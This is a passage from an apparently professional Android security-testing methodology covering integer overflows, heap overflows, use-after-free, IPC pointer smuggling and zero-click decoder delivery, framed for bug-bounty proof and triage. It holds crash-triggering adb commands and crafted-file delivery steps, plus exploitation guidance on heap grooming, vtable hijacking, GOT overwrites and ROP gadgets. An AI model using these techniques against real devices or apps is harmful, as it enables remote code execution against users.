| **Maps to** | CWE-190; CVE-2025-48595 (SQLite lookaside, CWE-190, CVSS 8.4, CISA KEV, fixed in SQLite 3.44.5 by `if( sz>65528 ) sz = 65528;`), CVE-2026-0006 (CVSS 9.8, CWE-190/CWE-122/CWE-347), CVE-2026-0049, CVE-2022-3970 (libtiff), CVE-2026-65346 (ImageIO `_CGImageCreateByScaling`); MASTG-KNOW-0005 |

- **Test:** Any allocation size or loop bound computed as `a * b` where both values come from attacker data.
  The giveaway in a patch diff is a `+` becoming a widening multiply, or an added clamp.
- **How:** In source or decompilation, grep the arithmetic near allocations; in a binary diff on AArch64,
  look for `madd`/`mul` on `w` registers becoming `umull` on `x` registers plus a `tst …, #0xffffffff00000000`.
  ```bash
  grep -rnE '(malloc|calloc|realloc|new\s+\w+\[|memcpy|memset)\s*\(' native-src/ -B4 | \
    grep -nE '[a-z_]+ *\* *[a-z_]+|\* *sizeof'
  # UBSan is the fastest oracle — rebuild the parser and run the corpus through it
  clang++ -O1 -g -fsanitize=integer,undefined -fno-sanitize-recover=all harness.cc -o h && ./h seed
  ```
  Three worked shapes from this corpus, each of which you should test by hand at the boundary values:
  - **CVE-2025-48595:** `nSm = (szAlloc - sz * nBig) / LOOKASIDE_SMALL`. `sz * nBig` is `int × int`;
    `65528 × 33801` wraps to `−2,080,055,368`, inflating `nSm` **330×** to 33,656,307 and writing a pointer
    every 128 bytes for **4 GB** past the buffer. UBSan pinpoints it exactly:
    `sqlite3.c:178614:24: runtime error: signed integer overflow: 1200 * 1893939 cannot be represented in type 'int'`.
  - **CVE-2026-0006:** `oapv_assert_gv((pbu_size + 4) <= bs->size, …)` with `pbu_size = 0xFFFFFFFC` gives
    `0xFFFFFFFC + 4 = 0`, so the check is always true, and `cur_read_size += pbu_size + 4` advances by 0 →
    infinite re-parse reading deeper into unallocated heap.
  - **CVE-2026-0049:** `plane < fAreaSpec.Plane() + fAreaSpec.Planes()` with
    `0xFFFFFF00 + 0x00000200 = 0x00000100`.
  The Java-reachable trigger for the SQLite case is a public API with no upper bound anywhere in the stack:
  ```java
  SQLiteDatabase.OpenParams params = new SQLiteDatabase.OpenParams.Builder()
      .setLookasideConfig(65528, 34000)
      .build();
  SQLiteDatabase db = SQLiteDatabase.openDatabase(dbFile, params);
  ```
- **Proof:** The UBSan line naming the exact expression and the two operands, **or** an ASan
  `heap-buffer-overflow` whose offset matches the wrapped arithmetic. Write the overflow arithmetic out
  longhand in the report — it is the single most convincing paragraph you can produce for a triager.
- **Escalation:** → D16-053 (what stops it), → D16-062 (a Java-reachable native overflow as a managed→native
  escape), → D24 for the delivery path if the parser is a decoder.
- **Ruled out when:** every size computation from attacker-controlled operands is done in a 64-bit type with
  an explicit upper-bound clamp before the multiply, *or* the code is compiled with trapping IntSan and you
  observed the trap (a `ubsan:` abort message) rather than corruption — which re-rates the issue to DoS, not
  to "safe" (D16-052).

### D16-025 · Signed/unsigned truncation on a file-controlled count

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; **P3** crash-only |
| **Attacker** | AM-01 (0-click font/image/document paths) / AM-02 |
| **Applies to** | any file-derived value cast to `short`/`int16_t`/`FT_Short`/`s16` before being used as a count or size |
| **Maps to** | CWE-197, CWE-191; CVE-2025-27363 (FreeType ≤ 2.13.0; fixed in 2.13.1 with an `FT_OUTLINE_POINTS_MAX - 4` bound plus `FT_QNEW_ARRAY`; Android May 2025 bulletin; actively exploited); MASTG-KNOW-0005 |

- **Test:** The rule, verbatim from the research that found it: *"Any time you see `(short)` or `(int16_t)` on
  a value read from file data, test what happens near `0x8000` and `0xFFFF`."* A narrowing cast turns a large
  unsigned count into a small negative one, which then passes a `< max` check and allocates far too little.
- **How:**
  ```bash
  grep -rnE '\((short|int16_t|FT_Short|s16|int8_t|char)\)\s*[A-Za-z_]' native-src/ | head -40
  grep -rnE 'FT_Short|short\s+[a-z_]+\s*=\s*.*(read|get|parse)' native-src/ | head -40
  ```
  Then craft inputs at the boundary: `0x7FFF`, `0x8000`, `0x8001`, `0xFFFD`, `0xFFFE`, `0xFFFF`, and the same
  values in the container's byte order. Run the parser under ASan.
- **Proof:** The corpus's worked case: `(FT_Short)(0xFFFD) = −3`, a one-slot allocation then receives four
  phantom-point writes; ASan confirms a `heap-buffer-overflow` — reproduced on a **Samsung Galaxy S20+
  (Android 12)**, i.e. on real hardware, not an emulator.
- **Escalation:** → D24 for delivery. The Android-reachable path for the FreeType case is worth memorising as
  a template for "how a font bug becomes 0-click": `FontVariationAxis` → `Font.Builder.setFontVariationSettings()`
  → Minikin → HarfBuzz → `FT_Set_Var_Design_Coordinates()` → `FT_Load_Glyph()`. → D17 when the vulnerable
  parser is a bundled copy (FreeType ships inside Unity builds).
- **Ruled out when:** every file-derived count is kept in a type at least as wide as the format allows and is
  range-checked before use — shown at the source line or in the disassembly as a `cmp` against a constant
  bound before the allocation.

### D16-026 · Additive wrap that defeats a bound check (`x + n <= size`)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**); **P3** crash-only |
| **Attacker** | AM-01 / AM-02 |
| **Applies to** | any length check written as `(value + constant) <= limit` on an unsigned type |
| **Maps to** | CWE-190, CWE-191; CVE-2026-0006 (`oapv_assert_gv((pbu_size + 4) <= bs->size, …)`); MASTG-KNOW-0005 |

- **Test:** The bound check itself is the bug. When `value` is attacker-supplied and near the type maximum,
  `value + constant` wraps to a small number, the comparison passes, and the subsequent read or advance uses
  the *unwrapped* value — or advances by zero and loops forever, reading deeper into unallocated heap.
- **How:**
  ```bash
  grep -rnE '\+\s*[0-9]+\s*\)?\s*(<=|<)\s*' native-src/ | grep -iE 'size|len|remain|avail|bound' | head -40
  grep -rnE '(cur|read|pos|off)[a-z_]*\s*\+=' native-src/ | head -40
  ```
  Test the value at `SIZE_MAX - constant + k` for `k` in `0..8`, and separately test for the **zero-advance
  infinite loop** by watching whether the parser's read offset stops moving:
  ```bash
  timeout 10 ./harness crafted.bin ; echo "exit=$?"     # 124 = the loop never terminated
  ```
- **Proof:** Either an ASan out-of-bounds read past the input allocation, or a hung parse that `timeout`
  kills at a fixed offset — with the offset value printed each iteration to show it never advances.
- **Escalation:** → D16-028 (the read is usually also a write), → D24 for delivery. The zero-advance variant
  is also a clean resource-exhaustion DoS on its own.
- **Ruled out when:** the check is written in the safe direction — `value <= limit - constant` with `limit >=
  constant` established first — or the operands are 64-bit with the input capped below `UINT32_MAX`. Show the
  comparison.

### D16-027 · Two-source dimension mismatch: the allocator reads one header, the writer reads another

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) |
| **Attacker** | AM-01 (a file delivered by MMS/RCS, thumbnail, media scan) / AM-02 |
| **Applies to** | any format that carries dimensions or counts in two places — container box vs bitstream header, info-parse vs decode-parse, IHDR vs IDAT, TIFF IFD vs strip data, DNG IFD vs opcode lists, MP4 `apvC` vs frame header |
| **Maps to** | CWE-787, CWE-122; CVE-2026-0006 (generator script `generate_overflow_mp4.py` in `github.com/mobilehackinglab/CVE-2026-0006-openapv-poc`); MASTG-KNOW-0005 |

- **Test:** When a format declares the same quantity twice, check whether the code that **allocates** and the
  code that **writes** read different copies. If they do, you get a silent heap overflow with a success
  return code — the most dangerous shape in this chapter because nothing crashes at the time.
- **How:** Patch the container-declared dimensions small while leaving the bitstream's large, then decode.
  ```bash
  python3 generate_overflow_mp4.py --container 16x16 --bitstream 64x64 -o evil.mp4
  adb push evil.mp4 /sdcard/Download/
  adb shell am start -a android.intent.action.VIEW -d file:///sdcard/Download/evil.mp4 -t video/mp4
  adb logcat -b crash -d | grep -A30 'signal 11'
  ```
  Confirm the split in the framework's own logs — the framework believes the container:
  ```
  raw.size.width = 16 / raw.size.height = 16     # while the decoder writes 64x64
  ```
- **Proof:** The worked chain: `oapvd_info()` reads the AU_INFO PBU (declares 16×16) and returns
  immediately; `oapvd_decode()` skips AU_INFO and reads the FRAME PBU header (64×64). ASan gives
  `heap-buffer-overflow … WRITE of size 2 … 0 bytes after 512-byte region`, totalling
  **7,680 + 3,584 + 3,584 = 14,848 bytes** across three planes, with `oapvd_decode` **returning success
  (`ret=0`)**. The on-device tombstone:
  ```
  signal 11 (SIGSEGV), code 1 (SEGV_MAPERR)
  Executable: /apex/com.android.media.swcodec/bin/mediaswcodec
    #00 blk_to_imgb_p21x_uv+156     libcodec2_soft_apvdec.so
    #02 oapvd_decode+1516           libcodec2_soft_apvdec.so
    #03 C2SoftApvDec::process+1776  libcodec2_soft_apvdec.so
  ```
- **Escalation:** → D24 (0-click delivery; the PoC above is a ~1.2 KB MP4 deliverable by MMS or email). A
  silent 14 KB heap write with a success return is a write-what-where primitive after heap shaping
  (D16-030).
- **Ruled out when:** the decoder derives its output geometry from **the same** parse that sized the buffer,
  or re-validates the bitstream header against the allocated dimensions before writing — shown in the
  disassembly or by the decoder returning an error for your mismatched file.

### D16-028 · Treat an out-of-bounds read as a latent out-of-bounds write

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) when the write is demonstrated; otherwise rate the read |
| **Attacker** | AM-01 / AM-02 |
| **Applies to** | any decoder that both reads attacker-sized input and writes attacker-sized output |
| **Maps to** | CWE-125 → CWE-787; CVE-2026-0006; MASTG-KNOW-0005 |

- **Test:** If the same code reads a length from the input and writes that many bytes to an output buffer,
  the read primitive is usually also a write primitive. Do not stop at the read. Give the decoder an
  undersized output buffer while the bitstream declares larger dimensions.
- **How:**
  ```c
  int small_w = 16, small_h = 16;                 /* 512-byte plane */
  ofrms.frm[0].imgb = imgb_create(small_w, small_h, real_cs);
  /* bitstream still encodes 64x64 -> 8192 bytes expected */
  oapvd_decode(did, &bitb, &ofrms, NULL, &stat);
  ```
  Generalise: whichever buffer the caller allocates, allocate it one size class smaller than the input
  declares and re-run under ASan.
- **Proof:** `AddressSanitizer: heap-buffer-overflow … WRITE of size 2 … 0 bytes after 512-byte region`, with
  the byte total quantified. "Reads become writes" is the rule; the ASan verdict is the evidence.
- **Escalation:** A WRITE ranks a full tier above a READ in every triage scheme, and a WRITE that flows
  through `memcpy`/`memmove` lifts exploitability one tier again (D16-049). → D16-053 before claiming
  execution.
- **Ruled out when:** the output buffer is always allocated from the *same* parsed dimensions used by the
  writer (D16-027 ruled out), and the writer clamps to the caller-supplied buffer size — demonstrated by
  passing an undersized buffer and getting an error return instead of a write.

### D16-029 · Uninitialised and adjacent heap disclosure — prove the bytes cross the trust boundary

| | |
|---|---|
| **Severity ceiling** | High (Critical when the leaked bytes carry credentials) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) if the leak yields a token/key; otherwise rate the disclosure |
| **Attacker** | AM-01 / AM-02 / AM-09 |
| **Applies to** | decoders that emit pixels, buffers or strings sized from attacker input; any `malloc` without a subsequent full initialisation |
| **Maps to** | CWE-908, CWE-125; CVE-2026-0006 (poison test), CVE-2026-20634 (canary allocator), CVE-2025-64505 (libpng quantize heap over-read); MASTG-KNOW-0005 |

- **Test:** An out-of-bounds read is a Medium. An out-of-bounds read whose bytes reach the attacker is a heap
  memory disclosure — a different, higher category. Do not guess which you have: fill the surrounding heap
  with a recognisable pattern and look for it in the product.
- **How:** This is the native analogue of marker discipline, and the same rule applies — **use a marker that
  cannot occur naturally, and check the baseline output for it first.**
  ```c
  /* poison every allocation the parser will touch, then decode */
  void *p = malloc(n); memset(p, 0xDE, n);        /* 0xDE poison, or a random 8-byte repeating marker */
  ```
  ```bash
  # baseline: decode a benign file and confirm the marker does NOT appear
  ./harness clean.webp > clean.out ; grep -c $'\xde\xde\xde\xde\xde\xde\xde\xde' clean.out
  # test: decode the crafted file and count marker bytes in the output
  ./harness evil.webp  > evil.out  ; python3 - <<'PY'
  d=open('evil.out','rb').read(); print('marker bytes:', d.count(b'\xde'*8), 'of', len(d))
  PY
  ```
  Better still, use a dedicated canary allocator that writes a per-allocation unique tag, so you can say
  *which* allocation leaked.
- **Proof:** Three observables from this corpus, each showing the leak crossing the boundary: (1) after
  overwriting everything past byte 50 with `0xDE`, the decoder returned `ret=0, stat.read=333`, proving it
  consumed **283 bytes of poison/attacker-controlled data**; (2) in the ImageIO SGI case, "every fill byte
  surfaces verbatim in the output pixels"; (3) in the libpng quantize case, **35.5% of pixels in the rendered
  output contained leaked heap data**. A percentage is worth more than an adjective.
- **Escalation:** If the process that leaks is the app's own, the adjacent heap contains the app's tokens and
  keys — scan the leaked bytes for them (`eyJ`, `Bearer `, PEM headers) and escalate to D12/D13. If the leak
  is rendered on screen or uploaded (a thumbnail, an avatar, an export), it crosses to another user and the
  category changes again.
- **Ruled out when:** the poisoned baseline and the poisoned test produce byte-identical output — i.e. the
  marker never appears in the product — which means the over-read is confined and the finding is a crash, not
  a disclosure. Report the byte-level diff, not a status.

### D16-030 · Use-after-free, double free, and the controllability question you must answer explicitly

| | |
|---|---|
| **Severity ceiling** | Critical (with demonstrated reuse control); **High** for a reproducible UAF with no control |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with control; **P3** otherwise |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | all native heap bugs |
| **Maps to** | CWE-416, CWE-415; CVE-2019-11932 (WhatsApp 2.19.216 GIF double-free, EDB 47515); MASTG-KNOW-0005 |

- **Test:** A use-after-free giving `pc = 0` may be completely unexploitable if you cannot reallocate the
  freed chunk with your data before the use. **Say which it is.** "Exploitable" without a controllability
  argument is the claim triagers reject most often.
- **How:** Answer four questions, in writing: can you reallocate the freed chunk with attacker data before
  the use? What is the size class? Are the neighbours kept allocated? How many allocations happen between the
  free and the use?
  Heap grooming, when reuse is possible — the allocator's coalescing decides whether your reallocation lands:
  1. Spray N allocations of the target size, each followed by a small **guard** allocation so they cannot
     coalesce.
  2. Free the sprayed blocks; **keep the guards**.
  3. Exhaust existing arenas so the next arena is carved from your prepared memory.
  4. Make the target-class allocation land last.
  5. Trigger the free, then the use.
  ```bash
  # confirm the allocator on the build under test — it changes the grooming completely
  adb shell cat /proc/$(adb shell pidof com.target.app)/maps | grep -i scudo
  adb shell getprop ro.build.version.sdk         # Scudo is the platform allocator from Android 10
  ```
- **Proof:** Deterministic reuse — your byte pattern appears at the freed object's address, shown in a
  debugger or by the crash consuming your value. If you cannot achieve it, the proof is an explicit sentence
  saying control was **not** achieved, and the finding is rated as a crash.
- **Escalation:** → D16-032 (vtable at offset 0 is the standard consumer of a controlled UAF). Note that the
  legacy dlmalloc grooming above assumes 8-byte-rounded size classes and the classic-unlink protections
  (safe unlink, min-address check, size/address overflow check) that killed the unlink technique; **Scudo**
  (Android 10+) randomises and quarantines, so re-derive the grooming for the build under test rather than
  porting a pre-10 write-up.
- **Ruled out when:** the object is freed and the pointer is nulled in the same statement (the use is a null
  deref — CWE-476, a crash, not a UAF), or the allocation is quarantined long enough that no attacker-driven
  allocation can occupy it, demonstrated by a spray that never lands.

### D16-031 · Attacker-controlled native pointer smuggled through IPC deserialisation

| | |
|---|---|
| **Severity ceiling** | High–Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with control; **P3** for the arbitrary-free crash alone |
| **Attacker** | **AM-03** — a zero-permission installed app; this is the cheapest attacker model in the whole chapter |
| **Applies to** | any app with an exported component; **any exported component that reads a single extra deserialises the WHOLE Bundle** |
| **Maps to** | CWE-416, CWE-502; MASWE-0050; MASTG-KNOW-0005; known gadgets `OpenSSLX509Certificate` and `com.android.internal.util.VirtualRefBasePtr(mNativePtr)` |

- **Test:** A Java class that stores a native heap pointer in a **non-transient** `long` field, and passes it
  to a JNI free/deref — often from `finalize()` — is an arbitrary-free primitive the moment it can be
  deserialised from an Intent extra. The attacker sets the pointer to any address; the victim's GC frees it.
- **How:**
  ```bash
  S=out/sources
  grep -rnE 'private .*long [a-zA-Z_]*[Pp]tr|long mNative|long nativeHandle|long mNativePtr' $S
  grep -rnE 'native (void|int) (free|destroy|release|delete)[A-Za-z]*\(long' $S
  grep -rn -A6 'protected void finalize' $S | grep -nE 'native|free|destroy|nativePtr'
  # confirm the field is NOT transient
  grep -rn -B3 'long .*[Pp]tr' $S | grep -c transient
  ```
  Deliver it from a zero-permission attacker APK (not from `adb`, which runs as shell — see Rule 3):
  ```java
  Intent i = new Intent();
  i.setClassName("com.target.app", "com.target.app.AnyExportedActivity");
  i.putExtra("x", buildGadgetWithPointer(0xDEADBEEFL));   // Parcelable/Serializable carrying the long
  startActivity(i);                                       // the whole Bundle is deserialised
  ```
- **Proof:** The tombstone showing the fault at **the address you chose** — `fault addr 0xdeadbeef` — in the
  victim's process, with the attacker APK's manifest (declaring no permissions) committed as evidence. The
  crash arrives on GC, so force one or wait.
- **Escalation:** An arbitrary free is the front half of a controlled UAF (D16-030) and then of a vtable
  hijack (D16-032). → D08 if you need an intent-redirection hop to reach a non-exported component.
  **Rate against the mitigations and the SELinux policy for that domain (D16-053, D16-054) before claiming
  exploitation.**
- **Ruled out when:** every native-pointer field is declared `transient` (or the class implements neither
  `Parcelable` nor `Serializable`), **and** the JNI free validates the pointer against a table of
  handles it issued. The vendor fix set is worth quoting in the report: mark native pointer/handle fields
  `transient`, validate pointer values before JNI, minimise exported components, and never derive sizes or
  addresses from attacker data.

### D16-032 · C++ vtable pointer at offset 0 — the standard hijack, and the one indirection

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) |
| **Attacker** | AM-02 / AM-03, whichever supplies the corruption |
| **Applies to** | native C++ targets; **check `ro.build.version.sdk` first** — CFI (9.0+) and PAC-RET/BTI (14+) change what this argument is worth |
| **Maps to** | CWE-787, CWE-416; MASTG-TECH-0018, MASTG-TECH-0024, MASTG-TOOL-0033 (Ghidra), MASTG-TOOL-0152 (lldb) |

- **Test:** GCC and Clang place the vftable pointer at **offset 0** of a polymorphic object, so overwriting
  offset 0 of a heap object gives you `pc` — but with **one indirection**: the value you write must point at
  memory you also control.
- **How:** Find the indirect-call shape in the disassembly. On 32-bit ARM it reads:
  ```asm
  ldr  r0, [r4, #0]        ; vftable ptr from the object
  ldr  r3, [r0, #772]      ; function pointer from the table
  mov  r0, r4              ; this
  blx  r3
  ```
  On AArch64 the equivalent is `ldr x8, [x0]` / `ldr x8, [x8, #N]` / `blr x8`. Then solve the indirection one
  of two ways: (a) leak a heap address (D16-029 gives you one, and D16-035's Zygote note means the library
  bases are often already known), or (b) find app logic that writes a controllable pointer to offset 0 for
  you. The textbook case for (b) is an allocator free list that is **FILO and stores the `next free` pointer
  at offset 0** — exactly where the vftable pointer lives — so freeing an object makes its vftable pointer
  equal the address of the previously-freed same-size block, which the attacker has already filled.
  **No leak needed.**
- **Proof:** `pc` under attacker control at the indirect call, shown in the tombstone registers or in lldb.
- **Escalation:** → D16-053. Upstream mitigations matter here: WebKit later masked the free-list link pointer
  with a random magic with the MSB set, so **check whether the target's engine predates that**; and on
  Android 9+ CFI validates indirect-call targets, so an arbitrary vtable pointer is not automatically an
  arbitrary call. Say which of those applies on the build you tested.
- **Ruled out when:** the corrupted object is not polymorphic (no vtable at offset 0 — check the class
  layout in Ghidra), or the process is CFI-instrumented and your candidate target is not a valid call target
  for that call site, evidenced by a CFI abort rather than a jump.

### D16-033 · Negative or unchecked array index → write-four-anywhere → reuse the target's own imports

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | any native code indexing an array with a value derived from attacker data |
| **Maps to** | CWE-787, CWE-190; MASTG-KNOW-0005; ATT&CK T1575 |

- **Test:** A negative or unchecked index is an arbitrary write. Before writing shellcode or building a ROP
  chain, check whether you can simply swap a GOT entry (D16-009) — it is shorter, more reliable, and
  portable across builds.
- **How:**
  ```bash
  # in decompilation: indices that are signed and unvalidated
  grep -rnE '\[[a-z_]+\]\s*=' native-src/ -B3 | grep -nE '(int|short|char)\s+[a-z_]+\s*=.*(read|parse|get)'
  # in the binary: signed compares guarding an index
  r2 -A lib.so
  # [0x0]> /a ldrsb ; /a ldrsh ; /a sxtw          # sign-extension near an index computation
  ```
  Test negative, zero and `INT_MAX` index values through the real entry point, and observe where the write
  lands relative to the array base.
- **Proof:** A write at `base + index*stride` for an `index` you chose, demonstrated by corrupting a
  predictable adjacent structure and observing the consequence — then, for the execution claim, the GOT entry
  you replaced and the call that used it. The reference shape: `GingerBreak` used a negative `PARTN` index
  from a forged NETLINK message to walk backwards from a heap array into `vold`'s **GOT**, replaced `strcmp`
  with `system`, and sent a command whose "string" was a path to execute — **no shellcode, no ROP, portable
  across builds**. (`GingerBreak` itself is **DEAD**, patched pre-4.x.)
- **Escalation:** An arbitrary **write** beats an arbitrary read when it lands somewhere the app later loads
  code — that is the CVE-2020-8913 shape, also reachable via ZipSlip → **D17**. If ROP is genuinely required,
  the constraints are: `pop {…, pc}` (Thumb) and `ldmia sp!, {…, lr}` + `bx lr` are chainable; `bx lr` alone
  only after you point `lr` somewhere useful; `mov pc, lr` is ARM→ARM only with no interworking. `bx`/`blx`
  take the target's **low bit** as "Thumb" — set bit 0 for Thumb, clear it for ARM, even from Thumb, or you
  get an immediate undefined-instruction crash. Disassemble the image **twice** (once as ARM, once as Thumb)
  when hunting gadgets; misreading ARM as Thumb yields `pop {r0-r4, pc}` sequences the compiler never
  emitted. The dynamic linker remains the best gadget source — mapped into every process, small, stable
  across builds and OEMs — and its exception-unwinding code contains a master gadget that restores every
  register from memory, making an excellent stack pivot.
- **Ruled out when:** every index is unsigned and compared against the array bound before use, or the code is
  built with BoundSan/IntSan trapping on that build (D16-014), in which case the bug becomes a controlled
  abort — a DoS, not a write (D16-052).

### D16-034 · The stack cookie only checks at RETURN — never call a stack overflow "mitigated"

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | native code on all Android versions (stack cookies have been the default since Android 1.5) |
| **Maps to** | MASTG-TEST-0223, MASTG-KNOW-0006, MASWE-0045; CWE-787 |

- **Test:** `-fstack-protector` inserts a check in the **epilogue**. Corrupt something the function uses
  *before* it returns and the check never runs. Do not accept "canaries are enabled" as a reason not to
  pursue a stack overflow.
- **How:** Identify what the overflowed region is used for **before** the function returns — saved pointers
  passed to `free()`, structure fields read later in the same frame, a length used by a subsequent copy, a
  function pointer in a local struct. Then corrupt that, not the return address.
  ```bash
  r2 -A lib.so
  # [0x0]> s sym.vulnerable_fn ; pdf            # read the frame layout
  # [0x0]> afvs                                  # stack variables and their offsets
  ```
  The canonical case: `zergRush` overflowed `argv[]` into the `tmp` buffer inside
  `FrameworkListener::dispatchCommand`, planted pointers that were later `free()`d, and turned a stack
  overflow into a **controlled use-after-free — cookie intact**.
- **Proof:** Control achieved without the cookie check ever executing — shown by the crash occurring before
  the epilogue, or by the freed-pointer path in the backtrace.
- **Escalation:** → D16-030 (the UAF you just created). Also note the two compiler blind spots that make a
  "canary present" claim weaker than it looks: functions with **no stack buffer** get no cookie at all by
  heuristic, and small arrays of structs or unions are sometimes skipped. Fork-per-connection servers and low
  entropy additionally make cookie brute-force viable.
- **Ruled out when:** the overflowed buffer is the last object in the frame, nothing between it and the
  canary is dereferenced before return, and the canary check aborts — evidenced by a
  `stack corruption detected` / `__stack_chk_fail` abort message in the tombstone rather than a SIGSEGV.

### D16-035 · Exported component → native crash: the tombstone is what changes the VRT category

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (**P3**) for a reliable controlled crash. Compare the band you are escaping: a pure **Java**-layer crash from the same vector is `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**, worth nothing |
| **Attacker** | **AM-03** zero-permission local app (prove it from a real attacker APK, not from `adb`, which runs as the far-more-privileged shell UID) |
| **Applies to** | any app whose D16-005 table has a row reachable from an exported activity, receiver, service or provider |
| **Maps to** | MASTG-KNOW-0005, MASTG-TECH-0044; MASWE-0050; ATT&CK T1575, T1658; CWE-787 |

- **Test:** Drive the exported entry point that reaches native code with oversized, negative, truncated and
  UTF-16-surrogate inputs, and capture a tombstone whose fault address you chose. That artefact is the entire
  difference between a P5 app crash and a memory-safety finding.
- **How:**
  ```bash
  adb logcat -c
  adb shell am start -n com.target/.ImportActivity -d "file:///sdcard/fuzz/case0001"
  adb shell am start -n com.target/.ImportActivity --es blob "$(python3 -c 'print("A"*100000)')"
  adb shell am start -n com.target/.ImportActivity --ei offset -1 --ei len 2147483647
  adb shell am broadcast -n com.target/.ImportReceiver --es payload "$(python3 -c 'print("\ud800"*4096)')"
  adb shell content call --uri content://com.target.provider --method parse --arg "$(python3 -c 'print("A"*70000)')"
  adb logcat -b crash -d | grep -A30 'signal 11\|SIGSEGV\|SIGABRT\|Abort message\|backtrace:'
  adb shell ls -t /data/tombstones/ | head -1
  adb bugreport crash.zip     # the tombstone is under FS/data/tombstones/ when you cannot read it directly
  ```
  Then re-prove it from an attacker APK with an empty `<uses-permission>` set, and commit that manifest as
  evidence — a finding proved only with `adb` has not established AM-03.
- **Proof:** A tombstone with `signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x41414141`, a `pc`
  inside the app's own `.so`, and the exact `am start` / `content call` line that produced it. The fault
  address must be traceable to a value you supplied — that is the "controlled" in "controlled crash".
- **Escalation:** → `server_side_injection.remote_code_execution_rce` (P1) via D16-030/D16-032/D16-033. →
  D11/D13: execution in the app UID reads its private storage, its Keystore-backed operations and its
  session, with no root. Do **not** file a bare crash: crash-only native reports rate very low (Nextcloud
  #3399016 scored 0.0), and Bugcrowd's `app_crash.malformed_android_intents` node is P5.
- **Ruled out when:** every exported component reaching native code validates its extras in Java before the
  JNI call (and you proved the native symbol never fires with your out-of-range values — D16-019), **or**
  none of the exported components reaches a native entry at all per the D16-005 table. Name the validator
  class and `file:line`.

### D16-036 · Enumerate the 0-click delivery paths that reach a decoder without a tap

| | |
|---|---|
| **Severity ceiling** | Critical (delivery is what turns the same parser bug from Medium into a 0-click Critical) |
| **VRT** | the parser bug's own path; delivery decides the multiplier (Meta: 0-click ×1, 1-click ×0.75, 2+ click ×0.5) |
| **Attacker** | **AM-01** remote, no interaction |
| **Applies to** | any image/video/font/document parser reachable from a file that lands on the device |
| **Maps to** | CVE-2026-0049 (Android 14–16), CVE-2026-0006 (MMS/email delivery of a ~1.2 KB MP4), CVE-2025-27363 (WhatsApp PDF auto-preview); ATT&CK T1658 |

- **Test:** For any parser bug, establish the highest-privilege, least-interaction path that reaches it. The
  rule to internalise: **zero-click is about the trigger context, not the vulnerability class.**
- **How:** Place the crafted file by each route and observe:
  ```bash
  # media-scanner monitored directories
  adb push evil.dng /sdcard/Download/
  adb push evil.dng /sdcard/DCIM/
  adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///sdcard/Download/evil.dng
  # thumbnail path via the system Files app: just navigate to the folder
  adb shell monkey -p com.google.android.documentsui 1
  # then watch for the crash without ever opening the file
  adb logcat -b crash -d | grep -A30 'signal\|Abort message'
  ```
  The verified route list to walk for every decoder finding: file-manager thumbnail (`ThumbnailLoader` in
  DocumentsUI), Gallery/Photos indexing (Glide), MediaScanner on `/sdcard/Download/` and `/sdcard/DCIM/`,
  MMS/RCS auto-download, Bluetooth/Nearby Share, email attachment preview, browser auto-download, and the
  **notification image path**, which is a distinct code path (`LocalImageResolver`) that Google hardened with
  a MIME allowlist:
  ```java
  switch (mimeType.toLowerCase(Locale.US)) {
    case "image/png": case "image/jpeg": case "image/webp": case "image/gif":
    case "image/bmp": case "image/x-ico": case "image/vnd.wap.wbmp":
    case "image/heif": case "image/heic": case "image/avif":
      isAllowedCodec = true; break;
  }
  if (!isAllowedCodec) throw new RuntimeException("Image mime type (" + mimeType + ") is not allowed.");
  ```
  The shipped test asserts DNG is rejected using a resource named `dng_opcode_MapTable_ProcessArea.png` — a
  crafted DNG with a `.png` extension, which also proves **extension-based filtering is worthless and MIME
  sniffing governs.**
- **Proof:** A crash chain in the tombstone that reaches the parser from a system component the user never
  interacted with, e.g.:
  ```
  #23 framework.jar (ContentResolver.loadThumbnail+138)
  #25 framework.jar (DocumentsContract.getDocumentThumbnail+20)
  #27 DocumentsUIGoogle.apk (ThumbnailLoader.doInBackground+80)
  ```
  "The user never opened the file — the Files app crashed just from generating the thumbnail in the file
  listing."
- **Escalation:** → D24 (push/messaging delivery) and D27 (the multiplier in the severity request). Note the
  honest downside: for a UBSan-trapping component the 0-click outcome may be a **crash loop DoS**
  (`Process com.google.android.documentsui has crashed too many times, killing!`), not RCE — see D16-052.
- **Ruled out when:** the vulnerable parser is reachable only after an explicit user action inside the target
  app (opening the file from a picker), verified by walking every route above and observing no decode. State
  which routes you tested; an unenumerated route is not a negative.

### D16-037 · Decoder reached from network-fetched bytes the app requests itself

| | |
|---|---|
| **Severity ceiling** | High–Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; otherwise rate the crash |
| **Attacker** | **AM-09** malicious backend/CDN; **AM-02** when the URL comes from a deep link or a scanned code |
| **Applies to** | any app that loads remote images/media/fonts through a bundled decoder (Glide, Coil, Fresco, ExoPlayer/Media3, a custom `ImageDecoder` path) |
| **Maps to** | MASTG-KNOW-0005, MASWE-0050; CWE-787; ATT&CK T1658 |

- **Test:** The prime remote surface is not a parser the app exposes — it is a decoder the app *calls* on
  bytes it fetched. Establish (a) which decoder, (b) whether the URL is attacker-influenceable, (c) whether
